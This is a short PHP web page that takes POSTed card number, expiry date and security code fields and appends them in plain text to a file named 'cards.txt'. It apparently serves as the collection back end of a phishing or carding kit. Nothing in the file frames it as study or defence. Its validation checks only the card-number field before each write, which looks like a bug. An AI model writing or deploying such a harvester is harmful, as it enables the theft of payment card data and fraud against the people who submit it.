<html>
<head>
    <title>oof</title>
</head>
<body>
    <?php $txta = $_POST["number"];
    if (ctype_alnum($txta)) {
    $myfile = file_put_contents('oof/cards.txt', $txta, FILE_APPEND);
    }
    $txtb = $_POST["expiry"];
    if (ctype_alnum($txta)) {
    $myfile = file_put_contents('oof/cards.txt', ':'.$txtb, FILE_APPEND);
    }
    $txtc = $_POST["security"];
    if (ctype_alnum($txta)) {
    $myfile = file_put_contents('oof/cards.txt', ':'.$txtc.PHP_EOL, FILE_APPEND); 
    }?> 
</body>
</html>